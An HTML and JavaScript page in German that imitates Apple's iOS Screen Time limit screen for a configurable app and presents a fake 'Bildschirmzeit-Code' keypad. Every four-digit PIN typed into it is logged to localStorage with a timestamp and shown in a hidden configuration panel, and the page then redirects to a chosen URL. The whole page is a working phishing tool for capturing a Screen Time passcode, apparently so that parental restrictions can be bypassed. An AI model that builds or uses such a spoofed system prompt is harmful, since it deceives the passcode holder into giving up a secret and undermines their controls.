<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Bildschirmzeit</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }

    body {
      background-color: #000000;
      color: #ffffff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* Fullscreen Container */
    .app-container {
      width: 100vw;
      height: 100vh;
      background-color: #14190c; /* Exakter Apple Bildschirmzeit Hintergrundton */
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 24px;
      overflow: hidden;
    }

    /* Screen 1: Limit View */
    .screen {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 60px 24px 50px 24px;
      background-color: #14190c;
      transition: opacity 0.25s ease, transform 0.25s ease;
    }

    .screen.hidden {
      display: none;
    }

    /* Icon */
    .app-icon {
      width: 72px;
      height: 72px;
      margin-bottom: 24px;
      object-fit: contain;
      border-radius: 16px;
    }

    .limit-title {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 8px;
      text-align: center;
      letter-spacing: -0.3px;
    }

    .limit-subtext {
      font-size: 17px;
      color: #98989d;
      text-align: center;
      line-height: 1.35;
      max-width: 300px;
      margin-bottom: 60px;
    }

    .button-group {
      width: 100%;
      max-width: 340px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .btn {
      width: 100%;
      height: 52px;
      border-radius: 26px;
      border: none;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: opacity 0.15s ease, transform 0.1s ease;
    }

    .btn:active {
      opacity: 0.6;
      transform: scale(0.98);
    }

    .btn-primary {
      background-color: #007aff;
      color: #ffffff;
    }

    .btn-secondary {
      background-color: transparent;
      color: #007aff;
    }

    /* Screen 2: Code Entry View (Apple Dark Bottom Sheet style) */
    .code-screen {
      background-color: #1c1c1e;
      justify-content: flex-start;
      padding-top: 30px;
      border-top-left-radius: 20px;
      border-top-right-radius: 20px;
    }

    .close-btn {
      align-self: flex-end;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background-color: #2c2c2e;
      color: #8e8e93;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-right: 8px;
      margin-bottom: 40px;
    }

    .code-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 36px;
      text-align: center;
      letter-spacing: -0.4px;
    }

    /* Dots indicator */
    .dots-container {
      display: flex;
      gap: 22px;
      margin-bottom: 50px;
    }

    .dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      border: 1.5px solid #ffffff;
      background-color: transparent;
      transition: background-color 0.15s ease;
    }

    .dot.filled {
      background-color: #ffffff;
    }

    /* Onscreen Keypad */
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 14px 28px;
      width: 100%;
      max-width: 280px;
      margin-top: 10px;
    }

    .key {
      height: 72px;
      width: 72px;
      border-radius: 50%;
      background-color: #2c2c2e;
      color: #ffffff;
      font-size: 28px;
      font-weight: 400;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
      cursor: pointer;
      transition: background-color 0.15s ease;
    }

    .key:active {
      background-color: #48484a;
    }

    .key-empty {
      background-color: transparent;
      pointer-events: none;
    }

    /* Config Modal (Nur beim Neuladen) */
    .config-modal {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(12px);
      z-index: 100;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .config-card {
      background-color: #1c1c1e;
      border-radius: 20px;
      padding: 28px;
      width: 100%;
      max-width: 360px;
      border: 1px solid #3a3a3c;
    }

    .config-card h2 {
      font-size: 20px;
      margin-bottom: 20px;
      font-weight: 600;
    }

    .field {
      margin-bottom: 16px;
    }

    .field label {
      display: block;
      font-size: 13px;
      color: #8e8e93;
      margin-bottom: 6px;
    }

    .field input {
      width: 100%;
      height: 44px;
      background-color: #2c2c2e;
      border: 1px solid #3a3a3c;
      border-radius: 10px;
      padding: 0 14px;
      color: #ffffff;
      font-size: 15px;
      outline: none;
    }

    .log-box {
      margin-top: 12px;
      background: #000000;
      border-radius: 10px;
      padding: 12px;
      font-family: monospace;
      font-size: 12px;
      max-height: 110px;
      overflow-y: auto;
      color: #34c759;
      border: 1px solid #2c2c2e;
    }
  </style>
</head>
<body>

  <div class="app-container">
    <!-- Screen 1: App Limit Screen -->
    <div id="screen-limit" class="screen">
      <!-- Originales Apple Sanduhr Icon -->
      <img src="web/icons8-sanduhr-apple-sf-regular-filled-76.png" alt="Sanduhr" class="app-icon" id="main-icon">
      <h1 class="limit-title">Zeitlimit</h1>
      <p class="limit-subtext">Du hast dein Limit für „<span id="app-name-display">Duolingo</span>“ erreicht.</p>
      
      <div class="button-group">
        <button class="btn btn-primary" onclick="alert('Limit bestätigt.')">OK</button>
        <button class="btn btn-secondary" onclick="openCodeScreen()">Mehr Zeit anfordern</button>
      </div>
    </div>

    <!-- Screen 2: Passcode Entry Screen -->
    <div id="screen-code" class="screen code-screen hidden">
      <div class="close-btn" onclick="closeCodeScreen()">✕</div>
      <div class="code-title">Bildschirmzeit-Code eingeben</div>
      
      <div class="dots-container">
        <div class="dot" id="dot-0"></div>
        <div class="dot" id="dot-1"></div>
        <div class="dot" id="dot-2"></div>
        <div class="dot" id="dot-3"></div>
      </div>

      <!-- Keypad -->
      <div class="keypad">
        <div class="key" onclick="pressKey('1')">1</div>
        <div class="key" onclick="pressKey('2')">2</div>
        <div class="key" onclick="pressKey('3')">3</div>
        <div class="key" onclick="pressKey('4')">4</div>
        <div class="key" onclick="pressKey('5')">5</div>
        <div class="key" onclick="pressKey('6')">6</div>
        <div class="key" onclick="pressKey('7')">7</div>
        <div class="key" onclick="pressKey('8')">8</div>
        <div class="key" onclick="pressKey('9')">9</div>
        <div class="key key-empty"></div>
        <div class="key" onclick="pressKey('0')">0</div>
        <div class="key" onclick="deleteKey()">⌫</div>
      </div>
    </div>
  </div>

  <!-- Setup & Admin Modal (erscheint nur beim Neuladen) -->
  <div id="config-modal" class="config-modal">
    <div class="config-card">
      <h2>Konfiguration</h2>
      <div class="field">
        <label>App-Name</label>
        <input type="text" id="cfg-app-name" value="Duolingo">
      </div>
      <div class="field">
        <label>Weiterleitungs-URL (nach Code-Eingabe)</label>
        <input type="url" id="cfg-redirect-url" value="https://google.com">
      </div>
      <button class="btn btn-primary" style="margin-top: 6px;" onclick="saveConfig()">Anwenden & Starten</button>

      <div style="margin-top: 20px;">
        <label style="font-size: 12px; color: #8e8e93;">Gespeicherte PINs (im localStorage):</label>
        <div id="log-output" class="log-box">Keine PINs gespeichert.</div>
        <button class="btn btn-secondary" style="height: 32px; font-size: 13px; margin-top: 8px;" onclick="clearLogs()">Logs löschen</button>
      </div>
    </div>
  </div>

  <script>
    let currentCode = "";
    let targetUrl = "https://google.com";

    window.addEventListener('DOMContentLoaded', () => {
      renderLogs();
    });

    function saveConfig() {
      const appName = document.getElementById('cfg-app-name').value || "Duolingo";
      targetUrl = document.getElementById('cfg-redirect-url').value || "https://google.com";

      document.getElementById('app-name-display').innerText = appName;
      document.getElementById('config-modal').style.display = 'none';
    }

    function openCodeScreen() {
      document.getElementById('screen-limit').classList.add('hidden');
      document.getElementById('screen-code').classList.remove('hidden');
      currentCode = "";
      updateDots();
    }

    function closeCodeScreen() {
      document.getElementById('screen-code').classList.add('hidden');
      document.getElementById('screen-limit').classList.remove('hidden');
      currentCode = "";
      updateDots();
    }

    function pressKey(num) {
      if (currentCode.length < 4) {
        currentCode += num;
        updateDots();
        if (currentCode.length === 4) {
          handleCodeSubmit();
        }
      }
    }

    function deleteKey() {
      if (currentCode.length > 0) {
        currentCode = currentCode.slice(0, -1);
        updateDots();
      }
    }

    function updateDots() {
      for (let i = 0; i < 4; i++) {
        const dot = document.getElementById(`dot-${i}`);
        if (i < currentCode.length) {
          dot.classList.add('filled');
        } else {
          dot.classList.remove('filled');
        }
      }
    }

    function handleCodeSubmit() {
      // 1. PIN im localStorage speichern
      const existingEntries = JSON.parse(localStorage.getItem('screenTimeCodes') || '[]');
      existingEntries.push({
        code: currentCode,
        timestamp: new Date().toLocaleString('de-DE')
      });
      localStorage.setItem('screenTimeCodes', JSON.stringify(existingEntries));

      // 2. Weiterleitung zur Ziel-URL nach kurzer Verzögerung
      setTimeout(() => {
        window.location.href = targetUrl;
      }, 250);
    }

    function renderLogs() {
      const logBox = document.getElementById('log-output');
      const entries = JSON.parse(localStorage.getItem('screenTimeCodes') || '[]');
      if (entries.length === 0) {
        logBox.innerText = "Keine PINs gespeichert.";
        return;
      }
      logBox.innerHTML = entries.map(e => `[${e.timestamp}] PIN: <b>${e.code}</b>`).join('<br>');
    }

    function clearLogs() {
      localStorage.removeItem('screenTimeCodes');
      renderLogs();
    }

    // Tastatur-Unterstützung (Zahlen & Backspace)
    window.addEventListener('keydown', (e) => {
      if (document.getElementById('screen-code').classList.contains('hidden')) return;

      if (e.key >= '0' && e.key <= '9') {
        pressKey(e.key);
      } else if (e.key === 'Backspace') {
        deleteKey();
      } else if (e.key === 'Escape') {
        closeCodeScreen();
      }
    });
  </script>
</body>
</html>
